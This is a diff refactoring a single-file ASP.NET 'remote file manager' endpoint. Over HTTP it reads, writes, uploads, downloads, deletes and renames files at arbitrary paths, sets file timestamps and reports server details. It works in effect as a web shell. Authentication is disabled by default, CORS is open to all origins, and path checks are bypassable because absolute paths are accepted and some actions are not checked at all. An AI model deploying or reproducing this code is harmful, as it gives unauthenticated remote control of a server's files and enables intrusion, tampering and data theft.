@@ -3,574 +3,329 @@
 <%@ Import Namespace="System.Web.Script.Serialization" %>
 <%@ Import Namespace="System.Collections.Generic" %>
 <script runat="server">
-    // Remote File Manager API - ASP.NET Version
-    // Single file deployment, no dangerous functions
+    string resultJson = "";
 
     void Page_Load(object sender, EventArgs e)
     {
-        // CORS headers
         Response.AddHeader("Access-Control-Allow-Origin", "*");
 
-        Response.ContentType = "application/json";
-        Response.Charset = "utf-8";
+        string action = Request.QueryString["action"];
+        if (string.IsNullOrEmpty(action)) action = Request.Form["action"];
+        if (string.IsNullOrEmpty(action)) return;
 
-        string action = GetParam("action");
-        if (action == null) action = "";
+        string password = Request.QueryString["password"];
+        if (string.IsNullOrEmpty(password)) password = Request.Form["password"];
 
-        // Return blank if no action provided
-        if (action == "")
-        {
-            Response.Flush();
-            HttpContext.Current.ApplicationInstance.CompleteRequest();
-            return;
-        }
-
-        // Get password from request (query string or form)
-        string password = "";
-        if (Request.QueryString["password"] != null && Request.QueryString["password"] != "")
-            password = Request.QueryString["password"];
-        else if (Request.Form["password"] != null && Request.Form["password"] != "")
-            password = Request.Form["password"];
-
-        // Access token configuration
+        // === PASSWORD CONFIG ===
         string PASSWORD = "your_password_here";
 
-        // Verify access token
-        if (PASSWORD != "" && PASSWORD != "your_password_here")
+        if (!string.IsNullOrEmpty(PASSWORD) && PASSWORD != "your_password_here")
         {
             if (password != PASSWORD)
             {
                 Response.StatusCode = 401;
                 Response.Write("{null}");
-                Response.Flush();
-                HttpContext.Current.ApplicationInstance.CompleteRequest();
                 return;
             }
         }
 
-        try
+        Response.ContentType = "application/json";
+        Response.Charset = "utf-8";
+
+        if (action == "list") DoList();
+        else if (action == "read") DoRead();
+        else if (action == "write") DoWrite();
+        else if (action == "mkdir") DoMkdir();
+        else if (action == "delete") DoDelete();
+        else if (action == "rename") DoRename();
+        else if (action == "upload") DoUpload();
+        else if (action == "download") { DoDownload(); return; }
+        else if (action == "touch") DoTouch();
+        else if (action == "info") DoInfo();
+        else if (action == "server") DoServer();
+        else resultJson = ToJson(false, null, "Unknown action");
+
+        if (!string.IsNullOrEmpty(resultJson))
         {
-            switch (action)
-            {
-                case "list":
-                    ListDirectory();
-                    break;
-                case "read":
-                    ReadFile();
-                    break;
-                case "write":
-                    WriteFile();
-                    break;
-                case "mkdir":
-                    CreateDirectory();
-                    break;
-                case "delete":
-                    DeleteItem();
-                    break;
-                case "rename":
-                    RenameItem();
-                    break;
-                case "upload":
-                    UploadFile();
-                    break;
-                case "download":
-                    DownloadFile();
-                    break;
-                case "touch":
-                    TouchFile();
-                    break;
-                case "info":
-                    GetFileInfo();
-                    break;
-                case "server":
-                    GetServerInfo();
-                    break;
-                default:
-                    SendResponse(false, null, "Unknown action");
-                    break;
-            }
-        }
-        catch (ResponseSentException)
-        {
-            // Response already sent, ignore
-        }
-        catch (Exception ex)
-        {
-            try { SendResponse(false, null, ex.Message); } catch (ResponseSentException) { }
+            Response.Write(resultJson);
         }
     }
 
-    string GetParam(string key)
+    string GetP(string k)
     {
-        if (Request.QueryString[key] != null && Request.QueryString[key] != "")
-            return Request.QueryString[key];
-        if (Request.Form[key] != null && Request.Form[key] != "")
-            return Request.Form[key];
-        return null;
+        string v = Request.QueryString[k];
+        if (string.IsNullOrEmpty(v)) v = Request.Form[k];
+        return v;
     }
 
-    string GetDefaultDir()
+    string DefDir() { return Path.GetDirectoryName(Request.PhysicalPath); }
+
+    string FixPath(string p)
     {
-        return Path.GetDirectoryName(Request.PhysicalPath);
+        if (string.IsNullOrEmpty(p) || p == "/") return DefDir();
+        p = p.Replace("../", "").Replace("..\\", "");
+        try { return Path.GetFullPath(p); } catch { return p; }
     }
 
-    string SafePath(string path)
+    string ToJson(bool ok, object data, string msg)
     {
-        if (path == null) path = "";
-        path = path.Replace("../", "").Replace("..\\", "");
-
-        if (path == "" || path == "/")
-            return GetDefaultDir();
-
-        try
-        {
-            return Path.GetFullPath(path);
-        }
-        catch
-        {
-            return path;
-        }
+        Dictionary<string, object> r = new Dictionary<string, object>();
+        r["success"] = ok;
+        r["data"] = data;
+        r["message"] = msg;
+        return new JavaScriptSerializer().Serialize(r);
     }
 
-    class ResponseSentException : Exception { }
-
-    void SendResponse(bool success, object data, string message)
+    string FmtSize(long b)
     {
-        Dictionary<string, object> result = new Dictionary<string, object>();
-        result.Add("success", success);
-        result.Add("data", data);
-        result.Add("message", message);
-        JavaScriptSerializer serializer = new JavaScriptSerializer();
-        Response.Write(serializer.Serialize(result));
-        throw new ResponseSentException();
-    }
-
-    string FormatSize(long bytes)
-    {
-        if (bytes == 0) return "0 B";
-        string[] units = new string[] { "B", "KB", "MB", "GB", "TB" };
-        int i = (int)Math.Floor(Math.Log(bytes) / Math.Log(1024));
+        if (b == 0) return "0 B";
+        string[] u = new string[] { "B", "KB", "MB", "GB", "TB" };
+        int i = (int)Math.Floor(Math.Log(b) / Math.Log(1024));
         if (i > 4) i = 4;
-        return Math.Round(bytes / Math.Pow(1024, i), 2) + " " + units[i];
+        return Math.Round(b / Math.Pow(1024, i), 2) + " " + u[i];
     }
 
-    string GetPermsString(string path)
-    {
-        try
-        {
-            FileAttributes attr = File.GetAttributes(path);
-            string info = ((attr & FileAttributes.Directory) != 0) ? "d" : "-";
-            info += "rwxr-xr-x";
-            return info;
-        }
-        catch
-        {
-            return "??????????";
-        }
-    }
+    long ToUnix(DateTime dt) { return (long)(dt.ToUniversalTime() - new DateTime(1970, 1, 1)).TotalSeconds; }
 
-    void ListDirectory()
+    void DoList()
     {
-        string pathParam = GetParam("path");
-        string path = SafePath(pathParam != null ? pathParam : "/");
-
-        if (!Directory.Exists(path))
-        {
-            SendResponse(false, null, "Not a valid directory");
-            return;
-        }
+        string p = FixPath(GetP("path"));
+        if (!Directory.Exists(p)) { resultJson = ToJson(false, null, "Not a valid directory"); return; }
 
         List<Dictionary<string, object>> items = new List<Dictionary<string, object>>();
+        string root = Path.GetPathRoot(p);
 
-        // Add parent directory
-        string root = Path.GetPathRoot(path);
-        if (path != root)
+        if (p != root && Directory.GetParent(p) != null)
         {
-            Dictionary<string, object> parentItem = new Dictionary<string, object>();
-            parentItem.Add("name", "..");
-            parentItem.Add("path", Path.GetDirectoryName(path));
-            parentItem.Add("is_dir", true);
-            parentItem.Add("size", 0);
-            parentItem.Add("size_formatted", "-");
-            parentItem.Add("mtime", 0);
-            parentItem.Add("perms", "drwxr-xr-x");
-            parentItem.Add("readable", true);
-            parentItem.Add("writable", true);
-            items.Add(parentItem);
+            Dictionary<string, object> parent = new Dictionary<string, object>();
+            parent["name"] = "..";
+            parent["path"] = Directory.GetParent(p).FullName;
+            parent["is_dir"] = true;
+            parent["size"] = 0;
+            parent["size_formatted"] = "-";
+            parent["mtime"] = 0;
+            parent["perms"] = "drwxr-xr-x";
+            parent["readable"] = true;
+            parent["writable"] = true;
+            items.Add(parent);
         }
 
-        // Add directories
         try
         {
-            string[] dirs = Directory.GetDirectories(path);
-            for (int i = 0; i < dirs.Length; i++)
+            foreach (string d in Directory.GetDirectories(p))
             {
-                DirectoryInfo dirInfo = new DirectoryInfo(dirs[i]);
-                long mtime = (long)(dirInfo.LastWriteTimeUtc - new DateTime(1970, 1, 1)).TotalSeconds;
+                DirectoryInfo di = new DirectoryInfo(d);
                 Dictionary<string, object> item = new Dictionary<string, object>();
-                item.Add("name", dirInfo.Name);
-                item.Add("path", dirInfo.FullName);
-                item.Add("is_dir", true);
-                item.Add("size", 0);
-                item.Add("size_formatted", "-");
-                item.Add("mtime", mtime);
-                item.Add("perms", GetPermsString(dirs[i]));
-                item.Add("readable", true);
-                item.Add("writable", true);
+                item["name"] = di.Name;
+                item["path"] = di.FullName;
+                item["is_dir"] = true;
+                item["size"] = 0;
+                item["size_formatted"] = "-";
+                item["mtime"] = ToUnix(di.LastWriteTime);
+                item["perms"] = "drwxr-xr-x";
+                item["readable"] = true;
+                item["writable"] = true;
                 items.Add(item);
             }
-
-            // Add files
-            string[] files = Directory.GetFiles(path);
-            for (int i = 0; i < files.Length; i++)
+            foreach (string f in Directory.GetFiles(p))
             {
-                FileInfo fileInfo = new FileInfo(files[i]);
-                long mtime = (long)(fileInfo.LastWriteTimeUtc - new DateTime(1970, 1, 1)).TotalSeconds;
+                FileInfo fi = new FileInfo(f);
                 Dictionary<string, object> item = new Dictionary<string, object>();
-                item.Add("name", fileInfo.Name);
-                item.Add("path", fileInfo.FullName);
-                item.Add("is_dir", false);
-                item.Add("size", fileInfo.Length);
-                item.Add("size_formatted", FormatSize(fileInfo.Length));
-                item.Add("mtime", mtime);
-                item.Add("perms", GetPermsString(files[i]));
-                item.Add("readable", true);
-                item.Add("writable", !fileInfo.IsReadOnly);
+                item["name"] = fi.Name;
+                item["path"] = fi.FullName;
+                item["is_dir"] = false;
+                item["size"] = fi.Length;
+                item["size_formatted"] = FmtSize(fi.Length);
+                item["mtime"] = ToUnix(fi.LastWriteTime);
+                item["perms"] = "-rwxr-xr-x";
+                item["readable"] = true;
+                item["writable"] = !fi.IsReadOnly;
                 items.Add(item);
             }
         }
-        catch (Exception ex)
-        {
-            SendResponse(false, null, "No permission to access: " + ex.Message);
-            return;
-        }
+        catch (Exception ex) { resultJson = ToJson(false, null, ex.Message); return; }
 
         Dictionary<string, object> data = new Dictionary<string, object>();
-        data.Add("path", path);
-        data.Add("items", items);
-        SendResponse(true, data, "");
+        data["path"] = p;
+        data["items"] = items;
+        resultJson = ToJson(true, data, "");
     }
 
-    void ReadFile()
+    void DoRead()
     {
-        string pathParam = GetParam("path");
-        string path = SafePath(pathParam != null ? pathParam : "");
-
-        if (!File.Exists(path))
-        {
-            SendResponse(false, null, "File does not exist: " + path);
-            return;
-        }
-
+        string p = FixPath(GetP("path"));
+        if (!File.Exists(p)) { resultJson = ToJson(false, null, "File not found: " + p); return; }
         try
         {
-            string content = File.ReadAllText(path);
+            string content = File.ReadAllText(p);
             Dictionary<string, object> data = new Dictionary<string, object>();
-            data.Add("path", path);
-            data.Add("content", content);
-            data.Add("size", content.Length);
-            SendResponse(true, data, "");
+            data["path"] = p;
+            data["content"] = content;
+            data["size"] = content.Length;
+            resultJson = ToJson(true, data, "");
         }
-        catch
-        {
-            SendResponse(false, null, "Read failed");
-        }
+        catch (Exception ex) { resultJson = ToJson(false, null, ex.Message); }
     }
 
-    void WriteFile()
+    void DoWrite()
     {
-        string pathParam = GetParam("path");
-        string path = pathParam != null ? pathParam : "";
+        string p = GetP("path");
         string content = Request.Form["content"];
+        if (string.IsNullOrEmpty(p)) { resultJson = ToJson(false, null, "Path empty"); return; }
         if (content == null) content = "";
-
-        if (path == "")
-        {
-            SendResponse(false, null, "Path cannot be empty");
-            return;
-        }
-
         try
         {
-            File.WriteAllText(path, content);
+            File.WriteAllText(p, content);
             Dictionary<string, object> data = new Dictionary<string, object>();
-            data.Add("bytes", content.Length);
-            SendResponse(true, data, "Saved successfully");
+            data["bytes"] = content.Length;
+            resultJson = ToJson(true, data, "Saved");
         }
-        catch
-        {
-            SendResponse(false, null, "Write failed");
-        }
+        catch (Exception ex) { resultJson = ToJson(false, null, ex.Message); }
     }
 
-    void CreateDirectory()
+    void DoMkdir()
     {
-        string pathParam = GetParam("path");
-        string path = pathParam != null ? pathParam : "";
-
-        if (path == "")
-        {
-            SendResponse(false, null, "Path cannot be empty");
-            return;
-        }
-
-        if (Directory.Exists(path))
-        {
-            SendResponse(false, null, "Directory already exists");
-            return;
-        }
-
-        try
-        {
-            Directory.CreateDirectory(path);
-            SendResponse(true, null, "Created successfully");
-        }
-        catch
-        {
-            SendResponse(false, null, "Create failed");
-        }
+        string p = GetP("path");
+        if (string.IsNullOrEmpty(p)) { resultJson = ToJson(false, null, "Path empty"); return; }
+        if (Directory.Exists(p)) { resultJson = ToJson(false, null, "Already exists"); return; }
+        try { Directory.CreateDirectory(p); resultJson = ToJson(true, null, "Created"); }
+        catch (Exception ex) { resultJson = ToJson(false, null, ex.Message); }
     }
 
-    void DeleteItem()
+    void DoDelete()
     {
-        string pathParam = GetParam("path");
-        string path = SafePath(pathParam != null ? pathParam : "");
-
-        if (path == "")
-        {
-            SendResponse(false, null, "Path cannot be empty");
-            return;
-        }
-
+        string p = FixPath(GetP("path"));
         try
         {
-            if (Directory.Exists(path))
-            {
-                Directory.Delete(path, true);
-            }
-            else if (File.Exists(path))
-            {
-                File.Delete(path);
-            }
-            else
-            {
-                SendResponse(false, null, "File does not exist");
-                return;
-            }
-            SendResponse(true, null, "Deleted successfully");
+            if (Directory.Exists(p)) Directory.Delete(p, true);
+            else if (File.Exists(p)) File.Delete(p);
+            else { resultJson = ToJson(false, null, "Not found"); return; }
+            resultJson = ToJson(true, null, "Deleted");
         }
-        catch
-        {
-            SendResponse(false, null, "Delete failed");
-        }
+        catch (Exception ex) { resultJson = ToJson(false, null, ex.Message); }
     }
 
-    void RenameItem()
+    void DoRename()
     {
-        string oldPathParam = GetParam("old_path");
-        string newPathParam = GetParam("new_path");
-        string oldPath = SafePath(oldPathParam != null ? oldPathParam : "");
-        string newPath = newPathParam != null ? newPathParam : "";
-
-        if (oldPath == "" || newPath == "")
-        {
-            SendResponse(false, null, "Path cannot be empty");
-            return;
-        }
-
+        string oldP = FixPath(GetP("old_path"));
+        string newP = GetP("new_path");
+        if (string.IsNullOrEmpty(newP)) { resultJson = ToJson(false, null, "New path empty"); return; }
         try
         {
-            if (Directory.Exists(oldPath))
-            {
-                Directory.Move(oldPath, newPath);
-            }
-            else if (File.Exists(oldPath))
-            {
-                File.Move(oldPath, newPath);
-            }
-            else
-            {
-                SendResponse(false, null, "File does not exist");
-                return;
-            }
-            SendResponse(true, null, "Renamed successfully");
+            if (Directory.Exists(oldP)) Directory.Move(oldP, newP);
+            else if (File.Exists(oldP)) File.Move(oldP, newP);
+            else { resultJson = ToJson(false, null, "Not found"); return; }
+            resultJson = ToJson(true, null, "Renamed");
         }
-        catch
-        {
-            SendResponse(false, null, "Rename failed");
-        }
+        catch (Exception ex) { resultJson = ToJson(false, null, ex.Message); }
     }
 
-    void UploadFile()
+    void DoUpload()
     {
-        string dirParam = GetParam("dir");
-        string dir = SafePath(dirParam != null ? dirParam : "/");
-
-        if (Request.Files.Count == 0)
-        {
-            SendResponse(false, null, "No file");
-            return;
-        }
-
+        string dir = FixPath(GetP("dir"));
+        if (Request.Files.Count == 0) { resultJson = ToJson(false, null, "No file"); return; }
         try
         {
-            HttpPostedFile file = Request.Files[0];
-            string targetPath = Path.Combine(dir, Path.GetFileName(file.FileName));
-            file.SaveAs(targetPath);
+            HttpPostedFile f = Request.Files[0];
+            string target = Path.Combine(dir, Path.GetFileName(f.FileName));
+            f.SaveAs(target);
             Dictionary<string, object> data = new Dictionary<string, object>();
-            data.Add("path", targetPath);
-            SendResponse(true, data, "Uploaded successfully");
+            data["path"] = target;
+            resultJson = ToJson(true, data, "Uploaded");
         }
-        catch
-        {
-            SendResponse(false, null, "Save failed");
-        }
+        catch (Exception ex) { resultJson = ToJson(false, null, ex.Message); }
     }
 
-    void DownloadFile()
+    void DoDownload()
     {
-        string pathParam = GetParam("path");
-        string path = SafePath(pathParam != null ? pathParam : "");
-
-        if (!File.Exists(path))
-        {
-            Response.StatusCode = 404;
-            Response.Write("File not found");
-            throw new ResponseSentException();
-        }
-
+        string p = FixPath(GetP("path"));
+        if (!File.Exists(p)) { Response.StatusCode = 404; Response.Write("Not found"); return; }
         Response.Clear();
         Response.ContentType = "application/octet-stream";
-        Response.AddHeader("Content-Disposition", "attachment; filename=\"" + Path.GetFileName(path) + "\"");
-        Response.TransmitFile(path);
-        throw new ResponseSentException();
+        Response.AddHeader("Content-Disposition", "attachment; filename=\"" + Path.GetFileName(p) + "\"");
+        Response.TransmitFile(p);
     }
 
-    void TouchFile()
+    void DoTouch()
     {
-        string pathParam = GetParam("path");
-        string path = SafePath(pathParam != null ? pathParam : "");
-        string timeStr = GetParam("time");
-
+        string p = FixPath(GetP("path"));
+        string ts = GetP("time");
         try
         {
-            DateTime newTime;
-            if (timeStr != null && timeStr != "")
+            DateTime dt = DateTime.Now;
+            if (!string.IsNullOrEmpty(ts))
             {
-                long timestamp = long.Parse(timeStr);
-                newTime = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc).AddSeconds(timestamp).ToLocalTime();
+                long sec = long.Parse(ts);
+                dt = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc).AddSeconds(sec).ToLocalTime();
             }
-            else
-            {
-                newTime = DateTime.Now;
-            }
-
-            if (Directory.Exists(path))
-            {
-                Directory.SetLastWriteTime(path, newTime);
-            }
-            else if (File.Exists(path))
-            {
-                File.SetLastWriteTime(path, newTime);
-            }
-            else
-            {
-                SendResponse(false, null, "File does not exist");
-                return;
-            }
-            SendResponse(true, null, "Modified successfully");
+            if (Directory.Exists(p)) Directory.SetLastWriteTime(p, dt);
+            else if (File.Exists(p)) File.SetLastWriteTime(p, dt);
+            else { resultJson = ToJson(false, null, "Not found"); return; }
+            resultJson = ToJson(true, null, "Modified");
         }
-        catch
-        {
-            SendResponse(false, null, "Modify time failed");
-        }
+        catch (Exception ex) { resultJson = ToJson(false, null, ex.Message); }
     }
 
-    void GetFileInfo()
+    void DoInfo()
     {
-        string pathParam = GetParam("path");
-        string path = SafePath(pathParam != null ? pathParam : "");
+        string p = FixPath(GetP("path"));
+        bool isDir = Directory.Exists(p);
+        bool isFile = File.Exists(p);
+        if (!isDir && !isFile) { resultJson = ToJson(false, null, "Not found"); return; }
 
-        bool isDir = Directory.Exists(path);
-        bool isFile = File.Exists(path);
+        Dictionary<string, object> data = new Dictionary<string, object>();
+        data["path"] = p;
+        data["name"] = Path.GetFileName(p);
+        data["is_dir"] = isDir;
 
-        if (!isDir && !isFile)
+        if (isFile)
         {
-            SendResponse(false, null, "File does not exist");
-            return;
+            FileInfo fi = new FileInfo(p);
+            data["size"] = fi.Length;
+            data["size_formatted"] = FmtSize(fi.Length);
+            data["mtime"] = ToUnix(fi.LastWriteTime);
+            data["ctime"] = ToUnix(fi.CreationTime);
+            data["atime"] = ToUnix(fi.LastAccessTime);
         }
-
-        try
+        else
         {
-            long size = 0;
-            long mtime = 0, ctime = 0, atime = 0;
-
-            if (isFile)
-            {
-                FileInfo fi = new FileInfo(path);
-                size = fi.Length;
-                mtime = (long)(fi.LastWriteTimeUtc - new DateTime(1970, 1, 1)).TotalSeconds;
-                ctime = (long)(fi.CreationTimeUtc - new DateTime(1970, 1, 1)).TotalSeconds;
-                atime = (long)(fi.LastAccessTimeUtc - new DateTime(1970, 1, 1)).TotalSeconds;
-            }
-            else
-            {
-                DirectoryInfo di = new DirectoryInfo(path);
-                mtime = (long)(di.LastWriteTimeUtc - new DateTime(1970, 1, 1)).TotalSeconds;
-                ctime = (long)(di.CreationTimeUtc - new DateTime(1970, 1, 1)).TotalSeconds;
-                atime = (long)(di.LastAccessTimeUtc - new DateTime(1970, 1, 1)).TotalSeconds;
-            }
-
-            Dictionary<string, object> data = new Dictionary<string, object>();
-            data.Add("path", path);
-            data.Add("name", Path.GetFileName(path));
-            data.Add("is_dir", isDir);
-            data.Add("size", size);
-            data.Add("size_formatted", FormatSize(size));
-            data.Add("mtime", mtime);
-            data.Add("ctime", ctime);
-            data.Add("atime", atime);
-            data.Add("perms", GetPermsString(path));
-            data.Add("perms_octal", "0755");
-            data.Add("readable", true);
-            data.Add("writable", true);
-            data.Add("owner", 0);
-            data.Add("group", 0);
-            SendResponse(true, data, "");
+            DirectoryInfo di = new DirectoryInfo(p);
+            data["size"] = 0;
+            data["size_formatted"] = "-";
+            data["mtime"] = ToUnix(di.LastWriteTime);
+            data["ctime"] = ToUnix(di.CreationTime);
+            data["atime"] = ToUnix(di.LastAccessTime);
         }
-        catch
-        {
-            SendResponse(false, null, "Get info failed");
-        }
+        data["perms"] = isDir ? "drwxr-xr-x" : "-rwxr-xr-x";
+        data["perms_octal"] = "0755";
+        data["readable"] = true;
+        data["writable"] = true;
+        data["owner"] = 0;
+        data["group"] = 0;
+        resultJson = ToJson(true, data, "");
     }
 
-    void GetServerInfo()
+    void DoServer()
     {
-        string currentUser = Environment.UserName;
-        long diskFree = 0;
-        long diskTotal = 0;
-
+        long diskFree = 0, diskTotal = 0;
         try
         {
-            DriveInfo driveInfo = new DriveInfo(Path.GetPathRoot(Request.PhysicalPath));
-            diskFree = driveInfo.AvailableFreeSpace;
-            diskTotal = driveInfo.TotalSize;
+            DriveInfo dr = new DriveInfo(Path.GetPathRoot(Request.PhysicalPath));
+            diskFree = dr.AvailableFreeSpace;
+            diskTotal = dr.TotalSize;
         }
         catch { }
 
-        string serverSoftware = Request.ServerVariables["SERVER_SOFTWARE"];
-        if (serverSoftware == null) serverSoftware = "IIS";
-
         Dictionary<string, object> data = new Dictionary<string, object>();
-        data.Add("php_version", Environment.Version.ToString());
-        data.Add("server_software", serverSoftware);
-        data.Add("document_root", Request.PhysicalApplicationPath);
-        data.Add("script_path", Request.PhysicalPath);
-        data.Add("upload_max", "30M");
-        data.Add("post_max", "30M");
-        data.Add("disk_free", FormatSize(diskFree));
-        data.Add("disk_total", FormatSize(diskTotal));
-        data.Add("current_user", currentUser);
-        SendResponse(true, data, "");
+        data["php_version"] = Environment.Version.ToString();
+        data["server_software"] = Request.ServerVariables["SERVER_SOFTWARE"] ?? "IIS";
+        data["document_root"] = Request.PhysicalApplicationPath;
+        data["script_path"] = Request.PhysicalPath;
+        data["upload_max"] = "30M";
+        data["post_max"] = "30M";
+        data["disk_free"] = FmtSize(diskFree);
+        data["disk_total"] = FmtSize(diskTotal);
+        data["current_user"] = Environment.UserName;
+        resultJson = ToJson(true, data, "");
     }
 </script>
